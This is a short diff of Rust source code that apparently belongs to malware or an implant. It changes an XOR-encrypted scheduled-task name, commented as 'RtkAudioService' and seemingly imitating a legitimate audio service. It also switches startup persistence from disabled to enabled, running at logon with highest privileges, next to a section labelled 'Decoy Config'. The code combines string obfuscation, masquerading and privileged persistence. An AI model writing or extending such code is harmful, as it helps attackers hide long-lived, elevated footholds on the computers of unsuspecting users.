@@ -111,7 +111,7 @@ mod encrypted_strings {
 
     // RtkAudioService
     pub fn task_name() -> String {
-        xor_decrypt(enc![0x1c, 0x59, 0x1c, 0x55, 0x01, 0x56, 0x06, 0x1e, 0x3a, 0x40, 0x19, 0x5b, 0x57, 0x3a, 0x1b, 0x5c, 0x10, 0x26])
+        xor_decrypt(enc![0x05, 0x46, 0x36, 0x58, 0x1d, 0x51, 0x19, 0x2c, 0x26, 0x61, 0x0a, 0x40, 0x42, 0x36, 0x30, 0x56])
     }
 
     // === Decoy Config ===
@@ -166,7 +166,7 @@ impl Config {
 
     pub fn get_startup_config() -> StartupConfig {
         StartupConfig {
-            enabled: false,
+            enabled: true,
             task_name: encrypted_strings::task_name(),
             on_logon: true,
             highest_privileges: true,
